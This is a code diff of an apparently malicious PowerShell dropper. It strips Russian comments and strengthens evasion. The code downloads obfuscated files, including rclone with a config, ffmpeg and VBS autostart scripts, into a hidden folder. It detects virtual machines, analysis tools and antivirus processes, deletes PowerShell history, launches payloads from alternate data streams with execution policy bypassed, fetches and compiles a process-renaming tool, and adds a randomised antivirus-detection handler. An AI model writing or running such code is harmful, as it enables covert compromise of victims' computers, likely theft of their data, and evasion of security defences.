@@ -54,15 +54,13 @@ try{
 if(-not(Test-Path $dest)){New-Item -ItemType Directory -Path $dest -Force|Out-Null}
 try{attrib +h $dest}catch{}
 
-# Определяем необходимые файлы для скачивания
 $neededFiles = @(
     DoubleObfuscate("system_cache.ps1",$key),
     DoubleObfuscate("rclone.exe",$key),
     DoubleObfuscate("rclone.conf",$key),
     DoubleObfuscate("ffmpeg.exe",$key)
 )
-# setup.vbs и TaskService.vbs скачиваются только если автозапуск через VBS нужен
-$useVbsAutostart = $true # если не нужен, поставить $false
+$useVbsAutostart = $true
 if ($useVbsAutostart) {
     $neededFiles += DoubleObfuscate("setup.vbs",$key)
     $neededFiles += DoubleObfuscate("TaskService.vbs",$key)
@@ -154,7 +152,6 @@ Start-Job{
     }
 }|Out-Null
 
-# Анти-VM/анализ
 try {
     $vmSigns = @("VBOX", "VMWARE", "QEMU", "KVM", "XEN", "VIRTUAL")
     $sysInfo = "$env:COMPUTERNAME $env:USERNAME $(Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)"
@@ -163,13 +160,11 @@ try {
     }
 } catch {}
 
-# Скрытие процесса через WMI (обфусцированная строка)
 try {
     $wmiHide = DoubleDeobfuscate(DoubleObfuscate("Get-WmiObject Win32_Process | Where-Object { $_.Name -eq 'powershell.exe' } | ForEach-Object { $_.Hide() }", 0x42), 0x42)
     Invoke-Expression $wmiHide
 } catch {}
 
-# Интеграция с ADS (альтернативный поток данных)
 try {
     $adsTarget = "$dest\$([guid]::NewGuid().Guid.Substring(0,8)).txt"
     " " | Set-Content -Path $adsTarget -Encoding ASCII
@@ -179,7 +174,6 @@ try {
     Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$adsStream`""
 } catch {}
 
-# Улучшенный junk-код
 for ($i=0; $i -lt (Get-Random -Minimum 3 -Maximum 8); $i++) {
     $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
     Set-Variable -Name $junkVar -Value ([guid]::NewGuid().ToString() + (Get-Random))
@@ -202,16 +196,8 @@ for ($i=0; $i -lt (Get-Random -Minimum 5 -Maximum 15); $i++) {
     $junk = [guid]::NewGuid().ToString() + (Get-Random)
 }
 
-# Дополнительные идеи:
-# - Проверка на наличие инструментов анализа (procmon, wireshark, etc.)
-# - Динамическая смена имени процесса через P/Invoke (требует C#/C++)
-# - Удаление истории PowerShell: Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
-# - Имитация легитимных процессов (например, запуск calc.exe, notepad.exe в фоне)
-# - Генерация случайных ошибок и логов для отвлечения внимания
-
 Remove-Variable -Name key, obfUrls, repo, gh, dest, localVersion, mainScript, neededFiles, randomFiles, exeFiles, exeRandomPaths, scps1, runPath -ErrorAction SilentlyContinue
 
-# Проверка на наличие инструментов анализа
 $analysisTools = @("procmon.exe","wireshark.exe","fiddler.exe","procexp.exe","tcpview.exe","ollydbg.exe","x64dbg.exe")
 try {
     $procs = Get-Process | Select-Object -ExpandProperty ProcessName
@@ -220,33 +206,39 @@ try {
     }
 } catch {}
 
-# Удаление истории PowerShell
 try {
     Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 } catch {}
 
-# Имитация легитимных процессов
 try {
     Start-Process calc.exe -WindowStyle Hidden
     Start-Process notepad.exe -WindowStyle Hidden
 } catch {}
 
-# Генерация случайных ошибок и логов
 for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 6); $i++) {
     Write-Error ("Random error: " + [guid]::NewGuid().ToString())
     Write-Output ("Random log: " + (Get-Random))
 }
 
-# Проверка на антивирусные процессы
-$avProcs = @("MsMpEng","avp","avg","avast","mcshield","clamwin","savservice","wrsa","f-secure","egui","ekrn","nod32","kaspersky","sophos","trend","symantec","defender")
+$avListObf = @(
+    DoubleObfuscate("MsMpEng",$key), DoubleObfuscate("avp",$key), DoubleObfuscate("avg",$key),
+    DoubleObfuscate("avast",$key), DoubleObfuscate("mcshield",$key), DoubleObfuscate("clamwin",$key),
+    DoubleObfuscate("savservice",$key), DoubleObfuscate("wrsa",$key), DoubleObfuscate("f-secure",$key),
+    DoubleObfuscate("egui",$key), DoubleObfuscate("ekrn",$key), DoubleObfuscate("nod32",$key),
+    DoubleObfuscate("kaspersky",$key), DoubleObfuscate("sophos",$key), DoubleObfuscate("trend",$key),
+    DoubleObfuscate("symantec",$key), DoubleObfuscate("defender",$key)
+)
+$avProcs = $avListObf | ForEach-Object { DoubleDeobfuscate($_, $key) }
+
 try {
-    $procs = Get-Process | Select-Object -ExpandProperty ProcessName
+    $wmiProcs = Get-WmiObject Win32_Process | Select-Object -Property Name, CommandLine, ExecutablePath
     foreach ($av in $avProcs) {
-        if ($procs -contains $av) { exit }
+        if ($wmiProcs | Where-Object { $_.Name -like "*$av*" -or $_.CommandLine -like "*$av*" -or $_.ExecutablePath -like "*$av*" }) {
+            Handle-AVDetection
+        }
     }
 } catch {}
 
-# Генерация junk-файлов с легитимным содержимым
 $legitContents = @("MZ", "PK", "This program cannot be run in DOS mode.", "SQLite format 3", "RIFF", "GIF89a")
 for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
     $junkFile = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
@@ -254,18 +246,7 @@ for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
     Set-Content -Path $junkFile -Value $content -Encoding ASCII
 }
 
-# Скачивание и запуск ProcessRenamer.exe (интеграция, ADS)
-$renamerExeName = [guid]::NewGuid().Guid.Substring(0,8) + ".exe"
-$renamerExePath = Join-Path $dest $renamerExeName
-$renamerUrl = "$repo/ProcessRenamer.exe"
-if (-not (Test-Path $renamerExePath)) {
-    try {
-        Invoke-WebRequest $renamerUrl -OutFile $renamerExePath -UseBasicParsing -TimeoutSec 10
-        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
-    } catch {}
-}
 try {
-    # ADS для exe
     $adsExeTarget = "$dest\$([guid]::NewGuid().Guid.Substring(0,8)).txt"
     " " | Set-Content -Path $adsExeTarget -Encoding ASCII
     $adsExeStream = "$adsExeTarget:renamer.exe"
@@ -274,7 +255,6 @@ try {
     Start-Process -FilePath $adsExeStream -ArgumentList ([guid]::NewGuid().ToString()) -WindowStyle Hidden
 } catch {}
 
-# Junk-код: запуск ProcessRenamer с разными аргументами
 for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 4); $i++) {
     try {
         $arg = ("junk_" + [guid]::NewGuid().Guid.Substring(0,8))
@@ -282,7 +262,6 @@ for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 4); $i++) {
     } catch {}
 }
 
-# Автоматическая компиляция ProcessRenamer.cs, если exe отсутствует
 $renamerExeName = [guid]::NewGuid().Guid.Substring(0,8) + ".exe"
 $renamerExePath = Join-Path $dest $renamerExeName
 $renamerCsPath = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".cs")
@@ -290,14 +269,11 @@ $renamerUrl = "$repo/ProcessRenamer.exe"
 $renamerCsUrl = "$repo/ProcessRenamer.cs"
 if (-not (Test-Path $renamerExePath)) {
     try {
-        # Скачиваем исходник, если exe нет
         Invoke-WebRequest $renamerCsUrl -OutFile $renamerCsPath -UseBasicParsing -TimeoutSec 10
-        # Пытаемся скомпилировать через csc.exe
         $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
         if (Test-Path $csc) {
             & $csc /target:exe /out:$renamerExePath $renamerCsPath
         }
-        # Если не удалось, пробуем скачать готовый exe
         if (-not (Test-Path $renamerExePath)) {
             Invoke-WebRequest $renamerUrl -OutFile $renamerExePath -UseBasicParsing -TimeoutSec 10
         }
@@ -305,7 +281,6 @@ if (-not (Test-Path $renamerExePath)) {
     } catch {}
 }
 
-# Junk-код: компиляция с фейковыми аргументами
 for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
     $fakeCs = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".cs")
     Set-Content -Path $fakeCs -Value "// junk file $(Get-Random)" -Encoding ASCII
@@ -317,7 +292,22 @@ for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
     } catch {}
 }
 
-# Очистка временных файлов
 try {
     Get-ChildItem -Path $dest -Filter *.tmp -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
 } catch {}
+
+function Handle-AVDetection {
+    $behaviors = @("exit", "sleep", "error", "cleanup")
+    $choice = $behaviors | Get-Random
+    switch ($choice) {
+        "exit"    { exit }
+        "sleep"   { while ($true) { Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 600) } }
+        "error"   { for ($i=0; $i -lt (Get-Random -Minimum 3 -Maximum 7); $i++) { Write-Error "Critical error: $([guid]::NewGuid())"; Start-Sleep -Seconds 2 } }
+        "cleanup" {
+            try {
+                Get-ChildItem -Path $dest -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
+            } catch {}
+            exit
+        }
+    }
+}
